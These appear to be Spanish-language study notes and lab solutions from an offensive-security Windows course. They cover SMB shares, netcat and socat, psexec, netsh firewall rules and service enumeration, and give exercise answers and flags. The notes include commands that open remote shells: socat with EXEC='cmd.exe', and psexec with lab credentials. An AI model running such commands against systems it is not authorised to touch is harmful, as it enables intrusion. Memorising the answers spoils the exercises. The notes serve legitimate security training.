Primero, analicemos brevemente un protocolo de red muy famoso conocido como *Server Message Block* (SMB). El protocolo SMB de la capa de aplicación permite a los clientes acceder a recursos compartidos (shares). De forma predeterminada, dependiendo del sistema operativo Windows, podemos esperar que SMB se ejecute en el puerto 139 o 445. Actualmente, existen varias versiones de SMB, e históricamente SMB tiene la reputación de ser muy vulnerable. Debido a esto, apuntar a SMB (o servicios similares) generalmente está en la parte superior de la lista para los atacantes.

A continuación, examinaremos los comandos *net share* y *net use*, que se relacionan directamente con los recursos compartidos. Estos comandos pueden montarse en cosas como recursos compartidos SMB. El comando net share nos ayuda a configurar y administrar recursos compartidos alojados en nuestra máquina local, y podemos aprovechar net use para conectarnos a recursos compartidos remotos, interactuar con ellos y administrar esas conexiones.

<br />

**net share**

Es importante conocer estos dos poderosos comandos porque es posible que no siempre tengamos las herramientas que queremos usar o la capacidad de usar la GUI. Es más probable tener acceso a la CLI y estos dos comandos son nativos (built-in). Podemos usar estas herramientas para girar lateralmente o transferir datos dentro o fuera de la red de destino.

Ejecutar *net share* sin ningún parámetro mostrará información sobre los *shares* actuales en la computadora local.

```
C:\WINDOWS\system32>net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share
E$           E:\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
```

Net share tiene más funciones que solo esto. Podemos observar esto con el comando de ayuda.

```
C:\Users\offensive>net share /?
The syntax of this command is:

NET SHARE
sharename
          sharename=drive:path [/GRANT:user,[READ | CHANGE | FULL]]
                               [/USERS:number | /UNLIMITED]
                               [/REMARK:"text"]
                               [/CACHE:Manual | Documents| Programs | BranchCache | None]
          sharename [/USERS:number | /UNLIMITED]
                    [/REMARK:"text"]
                    [/CACHE:Manual | Documents | Programs | BranchCache | None]
          {sharename | devicename | drive:path} /DELETE
          sharename \\computername /DELETE
...          
```

Aquí aprendemos que net share nos permite crear o eliminar shares.

<br />

**net use**

El siguiente comando que exploraremos es *net use* .

```
C:\Users\offensive>net use /?
The syntax of this command is:

NET USE
[devicename | *] [\\computername\sharename[\volume] [password | *]]
        [/USER:[domainname\]username]
        [/USER:[dotted domain name\]username]
        [/USER:[username@dotted domain name]
        [/SMARTCARD]
        [/SAVECRED]
        [/REQUIREINTEGRITY]
        [/REQUIREPRIVACY]
        [/WRITETHROUGH]
        [[/DELETE] | [/PERSISTENT:{YES | NO}]]

NET USE {devicename | *} [password | *] /HOME

NET USE [/PERSISTENT:{YES | NO}]
...
```

Esto nos permite no solo agregar o eliminar unidades de las máquinas en la misma red, sino también agregar persistencia, adjuntar como un usuario diferente y muchas otras cosas útiles. Vale la pena explorar esto más.

Para entender esto fácilmente, aprendamos cómo montar un remote share con net use pasando la letra de la unidad local que deseamos usar ( z:) y la ruta UNC al recurso compartido ( \\\\192.168.1.1\\public ) .

```
C:\WINDOWS\system32>net use \\192.168.1.1\public
The command completed successfully.
```

Cuando se completa el comando, podemos usar la unidad recién montada como cualquier otra. También podemos crear una conexión sin dispositivo, lo que significa que no hay letra de unidad.

```
C:\WINDOWS\system32>net use

Status       Local     Remote                    Network

-------------------------------------------------------------------------------
OK                     \\192.168.1.1\public
                                                Microsoft Windows Network
The command completed successfully.
```

<br />

**Exercise**

**1. Comparta la carpeta _system32_ con un nombre compartido de "mySharedData" y la bandera estará en el directorio c:\Users\offensive\. La bandera puede tardar entre 10 y 15 segundos en aparecer. (Ejecute el símbolo del sistema como administrador)**

```
net share mySharedData=C:\Windows\System32
```

<br />

**2. Asigne la unidad F a una carpeta compartida denominada finance ubicada en \\\\finance.outofthisworld.com\\finance con el usuario *finance*. La bandera estará en el directorio c:\\Users\\offensive\\. NOTA: El comando debe ejecutarse como usuario offensive. La bandera puede tardar entre 10 y 15 segundos en aparecer.**

Como el usuario 'offensive', esto es, sin recurrir a una shell de administrador.

```
net use f: \\finance.outofthisworld.com\finance /user:finance
```

La contraseña es 'finance'. Acto seguido aparecerá el fichero con la flag.

<br />

**3. Asigne la unidad G a una carpeta compartida llamada *marketing* ubicada en *\\\\marketing.outofthisworld.com\\* con el usuario y la contraseña de "marketing" y haga que la conexión sea constante, lo que significa que se volverá a conectar si reinicia su máquina. NOTA: El comando debe ejecutarse como usuario *offensive*. Es posible que deba esperar hasta 60 segundos para que aparezca la flag en C:\\Users\\offensive**

Como el usuario offensive, e introducimos la contraseña 'marketing'.

```
C:\Users\offensive>net use g: \\marketing.outofthisworld.com\marketing /user:marketing /PERSISTENT:YES
Enter the password for 'marketing' to connect to 'marketing.outofthisworld.com':
The command completed successfully.
```

<br />

##### 3.2.2. Netcat/Socat ()

*Netcat* (nc) es una poderosa herramienta que se puede utilizar para la administración remota, entre otras cosas. Netcat puede abrir puertos para permitir que otros clientes se conecten a la máquina, puede conectarse a otras máquinas, puede transferir archivos e incluso puede escanear puertos. Eso es mucho para desempacar, así que cubriremos los aspectos más destacados.

Abriremos dos terminales de símbolo del sistema diferentes y navegaremos a la carpeta Herramientas en el escritorio . En este escenario, la terminal 1 representa el servidor y la terminal 2 representa al cliente. Vamos a configurar un _oyente_ en la terminal 1 y luego conectarnos a nuestro oyente desde la terminal 2.

En la terminal 1, configuramos Netcat para escuchar las conexiones entrantes en el puerto TCP 1234. Usaremos la opción -n para deshabilitar la resolución de nombres DNS, -l para crear un oyente, -v para agregar detalle, -s 127.0.0.1 para listen en la interfaz localhost y -p para especificar el número de puerto de escucha.

```
C:\Users\offensive\Desktop\Tools>nc.exe -n -l -v -s 127.0.0.1 -p 1234
listening on [127.0.0.1] 1234 ...
```

Ahora que tenemos un oyente en el puerto 1234, podemos conectarnos desde el terminal 2.

```
C:\Users\offensive\Desktop\Tools>nc.exe 127.0.0.1 1234
```

Ahora tenemos la terminal 2 conectada a la terminal 1. En este caso específico, básicamente creamos una especie de funcionalidad de chat.

```
listening on [127.0.0.1] 1234 ...
Connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50334
Hello!
```

Todo lo que se escriba en un terminal se repetirá o transmitirá al otro terminal.

```
Hello!
Learning about netcat is fun
```

Una forma de cerrar la conexión es emitir lo que se llama una interrupción de señal o interrupción de señal manteniendo presionadas C + c al mismo tiempo cuando se encuentra dentro de una terminal. Esto detiene o elimina el proceso y, en nuestra situación, finalizará la conexión.

Socat es similar a Netcat, pero con mucha más funcionalidad. Se considera que Socat es una forma más estable de conectarse a máquinas remotas, ya que no finaliza inmediatamente cuando se cierra la conexión. También admite más protocolos como OPENSSL.

Al igual que con el ejemplo de Netcat, la terminal 1 representa el servidor y la terminal 2 representa el cliente. Nuevamente configuraremos un oyente en el terminal 1 y luego nos conectaremos desde el terminal 2. Iniciaremos un oyente en la interfaz de loopback con una dirección IP de 127.0.0.1 ( bind=127.0.0.1 ) en el puerto 5678 ( OPENSSL-ESCUCHAR:5678 ). La opción -d proporciona una salida de diagnóstico (detallada), cert=offsec.pem especifica el certificado SSL, verificar=0 omite la verificación del certificado y STDOUT permite que el terminal genere datos.

```
C:\Users\offensive\Desktop\Tools>socat.exe -d OPENSSL-LISTEN:5678,cert=offsec.pem, verify=0 STDOUT, bind=127.0.0.1
```

En la terminal 2, nos conectamos a 127.0.0.1 en el puerto 5678 ( OPENSSL:127.0.0.1:5678 ). El cmd.exe crea un acceso de terminal interactivo.

```
C:\Users\offensive\Desktop\Tools>socat.exe OPENSSL:127.0.0.1:5678, verify=0 EXEC=’cmd.exe’
```

Podemos volver a terminar la conexión emitiendo C + c .

Este es solo un ejemplo simple de cómo usar socat. La utilidad de ayuda para socat es muy detallada, como podemos observar en este extracto.

```
C:\Users\offensive\Desktop\Tools>socat.exe -h
socat by Gerhard Rieger and contributors - see www.dest-unreach.org
Usage:
socat [options] <bi-address> <bi-address>
   options:
      -V     print version and feature information to stdout, and exit
      -h|-?  print a help text describing command line options and addresses
      -hh    like -h, plus a list of all common address option names
      -hhh   like -hh, plus a list of all available address option names
      -d     increase verbosity (use up to 4 times; 2 are recommended)
      -D     analyze file descriptors before loop
      -ly[facility]  log to syslog, using facility (default is daemon)
      -lf<logfile>   log to file
      -ls            log to stderr (default if no other log)
      -lm[facility]  mixed log mode (stderr during initialization, then syslog)
      -lp<progname>  set the program name used for logging
      -lu            use microseconds for logging timestamps
      -lh            add hostname to log messages
      -v     verbose data traffic, text
      -x     verbose data traffic, hexadecimal
      -b<size_t>     set data buffer size (8192)
      -s     sloppy (continue on error)
      -t<timeout>    wait seconds before closing second channel
      -T<timeout>    total inactivity timeout in seconds
      -u     unidirectional mode (left to right)
      -U     unidirectional mode (right to left)
      -g     do not check option groups
      -L <lockfile>  try to obtain lock, or fail
      -W <lockfile>  try to obtain lock, or wait
      -4     prefer IPv4 if version is not explicitly specified
      -6     prefer IPv6 if version is not explicitly specified
```

Podemos observar el poder que tiene el socat. Siéntase libre de explorar esta utilidad por su cuenta.

**1. Hay un servicio ejecutándose en el puerto 4444. Usando netcat, conéctese al host del ejercicio. Una vez conectado, presione enter dos veces para revelar la bandera.**

```
C:\Users\offensive\Desktop\Tools>nc.exe 127.0.0.1 4444

WIN-NC{What_A_Connection!}
```

<br />

**2. Desde el host del ejercicio, inicie un escucha de netcat en el puerto 5555 para obtener el indicador.**

```
C:\Users\offensive\Desktop\Tools>nc.exe -l -v -p 5555
listening on [any] 5555 ...
connect to [127.0.0.1] from win-net01 [127.0.0.1] 50790
WIN-NC{Paylo4d_Pushed}
```

<br />

**4. ¿Qué grupo de opciones CHILD define la siguiente descripción?

Después de establecer una conexión, maneja su canal en un proceso secundario y mantiene el proceso principal intentando producir más conexiones, ya sea escuchando o conectándose en un bucle (ejemplo). SSL-CONNECT y SSL-LISTEN se diferencian en el momento en que bifurcan al niño: SSL-LISTEN se bifurca antes del protocolo de enlace SSL, mientras que SSL-CONNECT se bifurca después. Las opciones REINTENTAR y FOREVER no son heredadas por el proceso hijo.

<br />



##### 3.2.3. Remote Administration.

Muchas otras herramientas nos permiten ejecutar comandos de forma remota. *Windows Sysinternals* es una colección de herramientas gratuitas que pueden ayudar en tareas como el diagnóstico, la solución de problemas y la administración de sistemas Windows. *Psexec* es una de las herramientas CLI dentro de la suite Sysinternals que tiene muchas características, pero una de las características más destacadas es la capacidad de iniciar comandos en dispositivos remotos.

El siguiente comando psexec ejecutará cmd.exe . A su vez, el comando cmd ejecutará systeminfo . Todo esto sucede en el dispositivo remoto llamado "myComputer" y genera los resultados localmente.

```
C:\>psexec -i \myComputer cmd /c "systeminfo"

Host Name:                hostname
OS Name:                   Microsoft Windows 10 Home
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
```

Para abrir una sesión completamente interactiva con un requisito de nombre de usuario/contraseña, ejecutaríamos el siguiente comando:

```
C:\>psexec -i \myComputer -u username -p password cmd
```

Psexec se puede ejecutar en modos, cuenta interactiva y como cuenta del sistema y vale la pena investigarlo.

<br />

**Exercises**

**1. Usando psexec, lea el contenido de "psexec-flag1.txt" ubicado en la ubicación c:\\Users\\administrator\\Desktop. La dirección IP es 192.168.54.100, el nombre de usuario es "administrador" y la contraseña es "remoteadmin". (Ejecute el símbolo del sistema como administrador)**

Despúes de aceptar el eula con:

```
psexec /accepteula
```

Empleamos el siguiente comando:

```
C:\Windows\system32>psexec -i \\192.168.54.100 -u administrator -p remoteadmin cmd
```

Y se nos abrirá una cmd en el otro sistema con el que podremos leer el fichero.
<br />

**2. Con psexec, lea el contenido de "psexec-flag2.txt" ubicado en la ubicación c:\\Users\\administrator\\Desktop. La dirección IP es 192.168.54.100, el nombre de usuario es "administrador" y la contraseña es "remoteadmin". Nota: para leer este archivo, deberá ejecutarlo con privilegios del sistema.**

Modificamos el comando anterior como:

```
C:\Windows\system32>psexec -s -i \\192.168.54.100 -u administrator -p remoteadmin cmd
```


#### 3.3. Firewalls.

Un firewall es un dispositivo que regula el tráfico de red basado en reglas. El sistema operativo Windows tiene por defecto habilitado un firewall denominado Windows Defender Firewall.

**Netsh**

El comando *netsh* tiene dos opciones cuando se trata de interactuar con el firewall: *firewall* y *advfirewall*. Dado que la opción de *firewall* está obsoleta en el sistema operativo Windows moderno, y debido a que *advfirewall* tiene más capacidades, solo cubriremos brevemente la primera.

Podemos ejecutar netsh firewall con el ? parámetro para ver los comandos disponibles.

```
C:\WINDOWS\system32>netsh firewall ?

The following commands are available:

Commands in this context:
?              - Displays a list of commands.
add            - Adds firewall configuration.
delete         - Deletes firewall configuration.
dump           - Displays a configuration script.
help           - Displays a list of commands.
set            - Sets firewall configuration.
show           - Shows firewall configuration.
```

El resultado nos dice que podemos ejecutar algunos comandos básicos para agregar, eliminar, establecer o mostrar la configuración del firewall.

Comparemos eso con las características de netsh advfirewall .

```
C:\WINDOWS\system32>netsh advfirewall ?

The following commands are available:

Commands in this context:
?              - Displays a list of commands.
consec         - Changes to the `netsh advfirewall consec' context.
dump           - Displays a configuration script.
export         - Exports the current policy to a file.
firewall       - Changes to the `netsh advfirewall firewall' context.
help           - Displays a list of commands.
import         - Imports a policy file into the current policy store.
mainmode       - Changes to the `netsh advfirewall mainmode' context.
monitor        - Changes to the `netsh advfirewall monitor' context.
reset          - Resets the policy to the default out-of-box policy.
set            - Sets the per-profile or global settings.
show           - Displays profile or global properties.
```

Aquí observamos comandos como dump, export, import, reset show y set. Muchos de estos comandos serán útiles en esta sección.

Comencemos reiniciando el firewall.

```
C:\Windows\system32>netsh advfirewall reset
Ok.
```

Ahora, si visitamos la interfaz GUI del servidor de Windows, observaremos dos redes en la lista. Son Redes Privadas y Redes Invitadas o Públicas. Podemos observar resultados casi idénticos con el comando netsh .

```
C:\Windows\system32>netsh advfirewall show allprofiles

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096


Private Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096


Public Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.

C:\Windows\system32>
```

Hay posibilidades adicionales que podemos hacer con la sintaxis anterior. Podemos activar o desactivar el firewall para todos los usuarios o, según la configuración del registro, activar o desactivar el firewall para equipos remotos.

Con advfirewall, también podemos ver, agregar o eliminar reglas de entrada o salida, lo que nos brinda grandes capacidades. Inspeccionemos la sintaxis del comando agregar regla .

```
C:\WINDOWS\system32>netsh advfirewall firewall add rule ?

The number of arguments provided is not valid. Check help for the correct syntax.

Usage: add rule name=<string>
      dir=in|ou
      action=allow|block|bypass
      [program=<program path>]
      [service=<service short name>|any]
      [description=<string>]
      [enable=yes|no (default=yes)]
      [profile=public|private|domain|any[,...]]
      [localip=any|<IPv4 address>|<IPv6 address>|<subnet>|<range>|<list>]
      [remoteip=any|localsubnet|dns|dhcp|wins|defaultgateway|
         <IPv4 address>|<IPv6 address>|<subnet>|<range>|<list>]
      [localport=0-65535|<port range>[,...]|RPC|RPC-EPMap|IPHTTPS|any (default=any)]
      [remoteport=0-65535|<port range>[,...]|any (default=any)]
      [protocol=0-255|icmpv4|icmpv6|icmpv4:type,code|icmpv6:type,code|
         tcp|udp|any (default=any)]
      [interfacetype=wireless|lan|ras|any]
      [rmtcomputergrp=<SDDL string>]
      [rmtusrgrp=<SDDL string>]
      [edge=yes|deferapp|deferuser|no (default=no)]
      [security=authenticate|authenc|authdynenc|authnoencap|notrequired
         (default=notrequired)]
```

Como mínimo, necesitaremos crear un nombre para la regla, la dirección (hacia adentro o hacia afuera) y la acción (permitir, bloquear o evitar). Hay más opciones que podemos usar, como identificar un programa o servicio específico, protocolo, IP de origen o destino, puerto de origen o destino, la interfaz y si se requiere algún protocolo de autenticación.

Para demostrarlo, agregaremos una regla de firewall que evitará que hagamos ping en www.offensive-security.com . Primero, haremos ping al host para obtener su dirección IP y verificar que sea accesible.

```
C:\Users\user\Desktop>ping www.offensive-security.com

Pinging www.offensive-security.com [192.124.249.5] with 32 bytes of data:
Reply from 192.124.249.5: bytes=32 time=353ms TTL=55
Reply from 192.124.249.5: bytes=32 time=24ms TTL=55
Reply from 192.124.249.5: bytes=32 time=21ms TTL=55
Reply from 192.124.249.5: bytes=32 time=23ms TTL=55

Ping statistics for 192.124.249.5

    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 6ms, Maximum = 9ms, Average = 6ms
```

Ahora, agregaremos una nueva regla de firewall, especificando un nombre ( name="Deny Ping OffSec" ), dirección ( dir=in ), acción ( action=block ), protocolo ( protocol=icmpv4 ) y dirección IP remota ( ipremota=192.124.249.5 ).

```
C:\Users\user\Desktop>netsh advfirewall firewall add rule name="Deny Ping OffSec" dir=in action=block protocol=icmpv4 remoteip=192.124.249.5
Ok.

C:\Users\user\Desktop>netsh advfirewall firewall show rule name="Deny Ping OffSec"

Rule Name:                            Deny Ping OffSec
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                             In
Profiles:                               Domain,Private,Public
Grouping:                        
LocalIP:                                Any
RemoteIP:                            192.124.249.5/32
Protocol:                               ICMPv4
                               TypeCode
                               AnyAny
Edge traversal:                     No
Action:                                  Block
Ok.
```

Con nuestra regla de firewall agregada, podemos probar nuestro comando ping nuevamente.

```
C:\Users\user\Desktop>ping www.offensive-security.com

Pinging www.offensive-security.com [192.124.249.5] with 32 bytes of data:
General failure
General failure
General failure
General failure

Ping statistics for 192.124.249.5

    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),
```

Nuestra regla de firewall funciona correctamente y ya no podemos hacer ping a www.offensive-security.com . Ahora eliminemos la regla de firewall ( rule="Deny Ping OffSec" ) y volvamos a intentar nuestro ping .

```
C:\Users\user\Desktop>netsh advfirewall firewall delete rule name="Deny Ping OffSec"

Deleted 1 rule(s).
Ok.

C:\Users\user\Desktop>ping www.offensive-security.com

Pinging www.offensive-security.com [192.124.249.5] with 32 bytes of data:
Reply from 192.124.249.5: bytes=32 time=353ms TTL=55
Reply from 192.124.249.5: bytes=32 time=24ms TTL=55
Reply from 192.124.249.5: bytes=32 time=21ms TTL=55
Reply from 192.124.249.5: bytes=32 time=23ms TTL=55

Ping statistics for 192.124.249.5

    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 6ms, Maximum = 9ms, Average = 6ms
```

Después de eliminar la regla, pudimos volver a hacer ping en el sitio web porque el tráfico ya no estaba bloqueado.

Esto deshabilita la capacidad de ping para www.offensive-security.com , pero ¿qué pasaría si quisiéramos deshabilitar todos los accesos a www.offensive-security.com ? Podemos hacer eso con este comando.

```
C:\Users\user\Desktop>netsh advfirewall firewall add rule name="Block OffSec" remoteip=192.124.249.5 dir=out enable=yes action=block
Ok.
```

Esto puede parecer un poco drástico, pero quizás solo queramos bloquear el acceso al sitio web de Offensive Security. Podemos hacer eso ejecutando:

```
C:\Users\user\Desktop>netsh advfirewall firewall add rule name="Block OffSec" remoteip=192.124.249.5 dir=out enable=yes action=block remoteport=443 protocol=tcp
Ok.
```

<br />

```
C:\Users\user\Desktop>ping www.offensive-security.com

Pinging www.offensive-security.com [192.124.249.5] with 32 bytes of data:
Reply from 192.124.249.5: bytes=32 time=30ms TTL=52
Reply from 192.124.249.5: bytes=32 time=29ms TTL=52
```

Tenemos una buena base sobre cortafuegos. Esta fue una buena introducción a lo que podemos hacer con netsh.

Para todas las preguntas a continuación, utilizará el comando de versión advfirewall (Ejecute el símbolo del sistema como administrador) Las banderas estarán en C:\\Users\\offensive\\ .

<br />

**Exercises**

**1.  Habilite el firewall para que todos los perfiles obtengan la bandera.**

Nos logeamos a la máquina y desplegamos sucesivamente la ayuda de netsh advfirewall:

```
C:\Windows\system32>netsh advfirewall /?

The following commands are available:

Commands in this context:
?              - Displays a list of commands.
consec         - Changes to the `netsh advfirewall consec' context.
dump           - Displays a configuration script.
export         - Exports the current policy to a file.
firewall       - Changes to the `netsh advfirewall firewall' context.
help           - Displays a list of commands.
import         - Imports a policy file into the current policy store.
mainmode       - Changes to the `netsh advfirewall mainmode' context.
monitor        - Changes to the `netsh advfirewall monitor' context.
reset          - Resets the policy to the default out-of-box policy.
set            - Sets the per-profile or global settings.
show           - Displays profile or global properties.

The following sub-contexts are available:
 consec firewall mainmode monitor

To view help for a command, type the command, followed by a space, and then
 type ?.

C:\Windows\system32>netsh advfirewall set /?

The following commands are available:

Commands in this context:
set allprofiles - Sets properties in all profiles.
set currentprofile - Sets properties in the active profile.
set domainprofile - Sets properties in the domain profile.
set global     - Sets the global properties.
set privateprofile - Sets properties in the private profile.
set publicprofile - Sets properties in the public profile.

C:\Windows\system32>netsh advfirewall set allprofiles /?

Usage:  set allprofiles (parameter) (value)

Parameters:

      state             - Configure the firewall state.
              Usage: state on|off|notconfigured
[...]
```

De forma que se concluye que el comando a introducir:

```
C:\Windows\system32>netsh advfirewall set allprofiles state on
Ok.
```

Así, seguidamente podemos recoger la flag.

```
C:\Users\offensive>type defenderflag1.txt
WIN-FW{The_W4ll_Is_UP}
```

<br />

**2. Agregue una regla de firewall llamada "Allow SSH", la dirección de entrada (direction In), la acción está permitida, el puerto local es 22 y el protocolo es TCP para obtener la bandera.**

```
C:\Users\offensive>netsh advfirewall firewall add rule name="Allow SSH" dir=in action=allow protocol=tcp localport=22
Ok.


C:\Users\offensive>netsh advfirewall firewall show rule name="Allow SSH"

Rule Name:                            Allow SSH
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            22
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow
Ok.
```

<br />

**3. Restaure la configuración predeterminada del firewall y haga una copia de seguridad de la política actual en la unidad c con el nombre de "firewallPolicy.wfw" para obtener la bandera.**

En primer lugar, devolvemos el firewall a los valores originales:

```
netsh advfirewall reset
```

Y exportamos la configuración por defecto al fichero C:\\firewallPolicy.wfw, con elcomando:

```
netsh advfirewall export "C:\firewallPolicy.wfw"
```

Y obtenemos la falg

```
C:\Users\offensive>type defenderflag3.txt
WIN-FW{Back_To_The_Default}
```

<br />

#### 3.4. Services.

##### 3.4.1. Services Introduction (sc).

En Windows, un servicio de es un proceso que se ejecuta en segundo plano. Algunos buenos ejemplos de servicios son los controladores, los servicios de red y el software antivirus. Los servicios se pueden iniciar automáticamente durante el inicio del sistema, desde un activador o desencadenante, o se pueden iniciar manualmente. También pueden ejecutarse con diferentes permisos, como usuario sin privilegios o como SYSTEM. Generalmente, los servicios se ejecutan como no interactivos, pero podemos habilitarlos y deshabilitarlos. En las próximas dos secciones, usaremos comandos específicos de los servicios para interactuar con ellos.

Examinemos el inicio y la detención de un servicio con *sc*, que hace referencia al binario *Service Control*. Oficialmente, se conoce como *Service Control Manager* (SCM), que es un programa que habilita, deshabilita e interactúa con los servicios de Windows. Como pentesters, la utilidad *sc* es poderosa porque podemos usarla para cosas como la enumeración del sistema, la escalada de privilegios y la persistencia.

Para iniciar un servicio, ejecutamos *sc start* , pasando el nombre del servicio que queremos iniciar. Para detener un servicio, usamos sc stop como se muestra a continuación.

```
C:\Users\user\Desktop>sc start WSearch

SERVICE_NAME: WSearch
TYPE 10 WIN32_OWN_PROCESS
STATE: 3 STOP_PENDING
WIN32_EXIT_CODE: 0 (0X0)
SERVICE_EXIT_CODE: 0 (0X0)
CHECKPOINT: 0X1
WAIT_HINT: 0X7530

C:\Users\user\Desktop>sc stop WSearch

SERVICE_NAME: WSearch
TYPE 10 WIN32_OWN_PROCESS
STATE: 3 START_PENDING
WIN32_EXIT_CODE: 0 (0X0)
SERVICE_EXIT_CODE: 0 (0X0)
CHECKPOINT: 0X1
WAIT_HINT: 0X7d0
PID:2812
FLAGS:
```

<br />

##### 3.4.2. Service Applications Enumeration (tasklist, sc qc, PsService.exe).

Como operador ofensivo, la enumeración es clave para identificar vulnerabilidades y crear nuestros exploits. Es crucial asegurarse de que nos sentimos cómodos con varias herramientas y utilidades que recopilan información sobre los servicios del sistema. Exploremos algunos comandos que nos permiten ver los datos del sistema en los servicios.

<br />

**Tasklist**

El primer comando que vamos a ejecutar es el comando tasklist con el parámetro /svc . De forma predeterminada, este comando muestra procesos, que son similares a los servicios. En términos de operaciones normales, cada vez que un usuario ejecuta un ejecutable, el programa se maneja como un proceso más. Los procesos pueden iniciar o detener un servicio, pero no siempre tiene que suceder.

Comparativamente, y como ya se ha dicho, todos los servicios son procesos y no requieren la interacción del usuario. Aquí, podemos encontrar qué servicios, si los hay, están vinculados a los procesos.

```
C:\WINDOWS\system32>tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                       124 N/A
smss.exe                       520 N/A
csrss.exe                      696 N/A
wininit.exe                    784 N/A
csrss.exe                      792 N/A
winlogon.exe                   852 N/A
services.exe                   924 N/A
lsass.exe                      948 KeyIso, SamSs, VaultSvc
svchost.exe                    528 BrokerInfrastructure, DcomLaunch, PlugPlay,
                                   Power, SystemEventsBroker
svchost.exe                   2808 Wcmsvc
svchost.exe                   8368 Appinfo
svchost.exe                   9552 RmSvc
explorer.exe                  9280 N/A
svchost.exe                   5648 wscsvc
svchost.exe                   8064 OneSyncSvc_1dfa24,
                                   PimIndexMaintenanceSvc_1dfa24,
                                   UnistoreSvc_1dfa24, UserDataSvc_1dfa24
svchost.exe                   1296 Netman

```

Trabajar con procesos y servicios es una habilidad fundamental para los profesionales de la ciberseguridad. Tenemos que saber qué procesos y servicios se están ejecutando, con qué permisos se están ejecutando, si están configurados para ejecutarse automáticamente o si hay algún otro desencadenante, y cómo podemos defenderlos y/o explotarlos. El comando tasklist nos ayuda a identificar información para responder esas preguntas.

<br />

**sc query, sc qc**

Los siguientes comandos que examinaremos son sc query y sc qc . A continuación, ejecutamos cada comando, proporcionando dhcp como nombre del servicio.

```
C:\WINDOWS\system32>sc query dhcp

SERVICE_NAME: dhcp
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\WINDOWS\system32>sc qc dhcp
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: dhcp
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
        LOAD_ORDER_GROUP   : TDI
        TAG                : 0
        DISPLAY_NAME       : DHCP Clien
        DEPENDENCIES       : NSI
                           : Afd
        SERVICE_START_NAME : NT Authority\LocalService
```

Encontramos que *sc query* muestra información como el estado actual del servicio y ciertos códigos específicos del servicio. El comando *sc qc* muestra si el servicio tiene habilitado el inicio automático, qué dependencias están asociadas con el servicio y el nombre de la ruta binaria.

<br />

**PsService**

La última herramienta que vamos a cubrir es *PsService*, que forma parte de la suite Windows Sysinternals.

Generalmente conocido como Sysinternals, este recurso es una colección de software gratuito para diagnosticar y solucionar problemas de los sistemas Microsoft Windows. A pesar de que las herramientas se crearon con fines más administrativos, debido a sus increíbles capacidades, pueden usarse fácilmente con intenciones nefastas u ofensivas.

La desventaja de usar PsService es que no está integrado en Windows. PsService es muy similar a la utilidad sc, pero una cosa que PsService puede hacer que sc no puede hacer es acceder a un sistema remoto con una cuenta de usuario diferente. Esto puede ser útil cuando un determinado usuario tiene los permisos necesarios y podemos aprovechar eso.

```
C:\WINDOWS\system32>PsService.exe query WSearch

SERVICE_NAME: WSearch
DISPLAY_NAME: Windows Search
Provides content indexing, property caching, and search results for files, e-mail, and other content
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0 ms

C:\WINDOWS\system32>PsService.exe config WSearch

SERVICE_NAME: WSearch
DISPLAY_NAME: Windows Search
Provides content indexing, property caching, and search results for files, e-mail, and other content
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\SearchIndexer.exe /Embedding
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DEPENDENCIES       : RPCSS
     : BrokerInfrastructure
        SERVICE_START_NAME : Localsystem
        FAIL_RESET_PERIOD: 86400 seconds
```

Los comandos PService y sc mostrarán información de configuración similar con respecto a los servicios y tendrán capacidades similares.
